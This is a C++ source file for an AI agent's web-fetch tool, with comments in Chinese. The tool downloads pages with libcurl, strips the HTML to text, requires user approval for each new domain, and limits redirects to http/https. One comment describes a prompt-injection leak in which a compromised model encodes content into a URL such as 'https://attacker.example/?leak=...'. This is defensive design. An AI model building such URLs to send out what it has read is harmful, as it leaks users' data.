#include <curl/curl.h>
#include <json.hpp>

#include <algorithm>
#include <cstddef>
#include <string>

#include "MaiBlockingCheck.h"
#include "MaiWebFetchTool.h"

// webfetch：抓一个网页，转成纯文本给模型。
//
// ── 为什么要审批 ────────────────────────────────────────────────
//
// 这是**唯一一个往外发数据**的工具。模型读到的内容可能被提示词注入污染，
// 而一个被诱导的模型可以把刚读到的东西编进 URL 发出去
//（`https://attacker.example/?leak=<内容>`）。所以每个新域名都要用户点一次头。
//
// 会话级豁免的键收到**域名**这一级：给 docs.example.com 点一次「以后都允许」，
// 不该连 attacker.example 一起放行。
//
// ── HTML 怎么转文本 ─────────────────────────────────────────────
//
// 只做最朴素的一套：去掉 script / style 的整块，去掉标签，还原几个常见实体，
// 合并空白。**不求还原排版**——模型要的是这页说了什么，不是它长什么样，
// 而一个真正的 HTML 解析器是另一个量级的依赖。

namespace {

using json = nlohmann::json;

constexpr long kConnectTimeoutSeconds = 10;
constexpr long kTotalTimeoutSeconds = 30;
// 下载的上限。网页很容易几 MB，而模型能读进去的就那么点。
constexpr std::size_t kMaxDownloadBytes = 2 * 1024 * 1024;
// 转成文本之后给模型的上限。
constexpr std::size_t kMaxTextBytes = 32 * 1024;

json parseArguments(const std::string& raw) {
    json parsed = json::parse(raw, nullptr, false);
    return parsed.is_object() ? parsed : json::object();
}

struct Download {
    std::string body;
    bool truncated = false;
};

std::size_t writeCallback(char* data, std::size_t size, std::size_t count, void* userdata) {
    auto* download = static_cast<Download*>(userdata);
    const std::size_t bytes = size * count;
    if (download->body.size() >= kMaxDownloadBytes) {
        download->truncated = true;
        // **照常返回收下了**。返回别的数会让 curl 报错中止，那样连已经收到的
        // 半页内容都拿不到；我们只是不再往里存。
        return bytes;
    }
    const std::size_t room = kMaxDownloadBytes - download->body.size();
    download->body.append(data, std::min(room, bytes));
    if (bytes > room) download->truncated = true;
    return bytes;
}

// 取 URL 里的主机名，用来做审批的键。取不到返回空。
std::string hostOf(const std::string& url) {
    const std::size_t schemeEnd = url.find("://");
    if (schemeEnd == std::string::npos) return std::string();
    const std::size_t begin = schemeEnd + 3;
    const std::size_t end = url.find_first_of("/?#", begin);
    std::string host = url.substr(begin, end == std::string::npos ? end : end - begin);
    // 去掉可能带的用户名密码和端口。
    const std::size_t at = host.find('@');
    if (at != std::string::npos) host = host.substr(at + 1);
    const std::size_t colon = host.find(':');
    if (colon != std::string::npos) host = host.substr(0, colon);
    std::transform(host.begin(), host.end(), host.begin(),
                   [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
    return host;
}

bool isHttpUrl(const std::string& url) {
    return url.compare(0, 7, "http://") == 0 || url.compare(0, 8, "https://") == 0;
}

// 把一整块标签连同内容一起删掉（script / style 里的东西不是正文）。
void removeElement(std::string& html, const std::string& tag) {
    const std::string open = "<" + tag;
    const std::string close = "</" + tag + ">";
    std::size_t at = 0;
    while (true) {
        const std::size_t begin = html.find(open, at);
        if (begin == std::string::npos) break;
        const std::size_t end = html.find(close, begin);
        if (end == std::string::npos) {
            html.erase(begin);
            break;
        }
        html.erase(begin, end + close.size() - begin);
        at = begin;
    }
}

void replaceAll(std::string& text, const std::string& from, const std::string& to) {
    if (from.empty()) return;
    std::size_t at = text.find(from);
    while (at != std::string::npos) {
        text.replace(at, from.size(), to);
        at = text.find(from, at + to.size());
    }
}

std::string htmlToText(std::string html) {
    removeElement(html, "script");
    removeElement(html, "style");
    removeElement(html, "noscript");
    removeElement(html, "svg");

    // 块级标签换成换行，正文才不会糊成一整段。
    for (const char* tag : {"</p>", "</div>", "</li>", "</tr>", "</h1>", "</h2>", "</h3>", "</h4>",
                            "</h5>", "</h6>", "<br>", "<br/>", "<br />"}) {
        replaceAll(html, tag, "\n");
    }

    std::string text;
    text.reserve(html.size() / 2);
    bool insideTag = false;
    for (char c : html) {
        if (c == '<') {
            insideTag = true;
            continue;
        }
        if (c == '>') {
            insideTag = false;
            continue;
        }
        if (!insideTag) text.push_back(c);
    }

    // 只还原最常见的几个实体。全套实体表是另一个量级的东西，
    // 而漏掉一个生僻实体的代价只是模型看到 `&hellip;` 这种字面量。
    replaceAll(text, "&nbsp;", " ");
    replaceAll(text, "&lt;", "<");
    replaceAll(text, "&gt;", ">");
    replaceAll(text, "&quot;", "\"");
    replaceAll(text, "&#39;", "'");
    replaceAll(text, "&amp;", "&");

    // 合并空白：连续空行压成一个，行首行尾的空白去掉。
    std::string tidy;
    tidy.reserve(text.size());
    std::string line;
    int blankRun = 0;
    const auto flushLine = [&]() {
        const std::size_t begin = line.find_first_not_of(" \t\r");
        const std::size_t end = line.find_last_not_of(" \t\r");
        const std::string trimmed =
            begin == std::string::npos ? std::string() : line.substr(begin, end - begin + 1);
        line.clear();
        if (trimmed.empty()) {
            ++blankRun;
            if (blankRun <= 1 && !tidy.empty()) tidy += "\n";
            return;
        }
        blankRun = 0;
        tidy += trimmed;
        tidy += "\n";
    };
    for (char c : text) {
        if (c == '\n') {
            flushLine();
        } else {
            line.push_back(c);
        }
    }
    flushLine();
    return tidy;
}

class WebFetchTool final : public MaiTool {
    std::string mCaBundlePath;

public:
    explicit WebFetchTool(std::string caBundlePath) : mCaBundlePath(std::move(caBundlePath)) {}
    std::string name() const override {
        return "webfetch";
    }

    std::string description() const override {
        return "Fetch a web page over http or https and return it as plain text. Use it to read "
               "documentation or an issue page. Only the text is returned; layout, images and "
               "scripts are dropped.";
    }

    std::string parametersSchema() const override {
        return R"({"type":"object","properties":{)"
               R"("url":{"type":"string","description":"The http or https URL to fetch"}},)"
               R"("required":["url"]})";
    }

    // **每个新域名都要问。** 这是唯一一个往外发数据的工具：模型读到的东西可能
    // 被提示词注入污染，而被诱导的模型可以把内容编进 URL 发出去。
    bool requiresApproval(const std::string& argumentsJson) const override {
        (void)argumentsJson;
        return true;
    }

    // 豁免收到域名这一级：给一个文档站点头，不该连别的站一起放行。
    std::string approvalKey(const std::string& argumentsJson) const override {
        const json args = parseArguments(argumentsJson);
        const std::string host = hostOf(args.value("url", std::string{}));
        return host.empty() ? "webfetch:<unknown>" : "webfetch:" + host;
    }

    MaiToolResult execute(const std::string& raw, const MaiToolContext& context) override {
        const json args = parseArguments(raw);
        const std::string url = args.value("url", std::string{});
        if (url.empty()) {
            return MaiToolResult::failure(MaiErrorCode::InvalidInput,
                                          "missing required parameter: url");
        }
        if (!isHttpUrl(url)) {
            return MaiToolResult::failure(
                MaiErrorCode::InvalidInput,
                "only http and https URLs can be fetched, but got: " + url);
        }

        maiAssertBlockingAllowed("webfetch");
        CURL* curl = curl_easy_init();
        if (curl == nullptr) {
            return MaiToolResult::failure(MaiErrorCode::Internal, "curl_easy_init failed");
        }

        Download download;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        if (!mCaBundlePath.empty()) curl_easy_setopt(curl, CURLOPT_CAINFO, mCaBundlePath.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &download);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, kConnectTimeoutSeconds);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, kTotalTimeoutSeconds);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 5L);
        curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
        curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "MaiAgent/0.1");
        // **把协议锁死在 http/https。** curl 默认还认 file:// gopher:// smb:// 之类，
        // 一个重定向就能把「抓网页」变成「读本地文件」——那是绕过工作目录边界的路。
#ifdef CURLOPT_PROTOCOLS_STR
        curl_easy_setopt(curl, CURLOPT_PROTOCOLS_STR, "http,https");
        curl_easy_setopt(curl, CURLOPT_REDIR_PROTOCOLS_STR, "http,https");
#else
        curl_easy_setopt(curl, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
        curl_easy_setopt(curl, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
#endif

        const CURLcode code = curl_easy_perform(curl);
        long status = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status);
        char* finalUrl = nullptr;
        curl_easy_getinfo(curl, CURLINFO_EFFECTIVE_URL, &finalUrl);
        const std::string landed = finalUrl != nullptr ? std::string(finalUrl) : url;
        curl_easy_cleanup(curl);

        if (code != CURLE_OK) {
            return MaiToolResult::failure(
                MaiErrorCode::Network,
                std::string("could not fetch the page: ") + curl_easy_strerror(code));
        }
        if (status >= 400) {
            // 状态码本身就是有用的信息，别吞掉——404 和 403 的下一步完全不一样。
            return MaiToolResult::failure(
                MaiErrorCode::Network,
                "the server replied with HTTP " + std::to_string(status) + " for " + landed);
        }

        std::string text = htmlToText(download.body);
        bool truncated = download.truncated;
        if (text.size() > kMaxTextBytes) {
            text.resize(kMaxTextBytes);
            truncated = true;
        }
        if (text.empty()) text = "(the page had no readable text)";

        std::string out = landed + "\n\n" + text;
        if (truncated) out += "\n\n[the page was longer than this and got cut off]";
        return MaiToolResult::success(std::move(out), truncated);
    }
};

}  // namespace

std::unique_ptr<MaiTool> makeMaiWebFetchTool(std::string caBundlePath) {
    return std::make_unique<WebFetchTool>(std::move(caBundlePath));
}
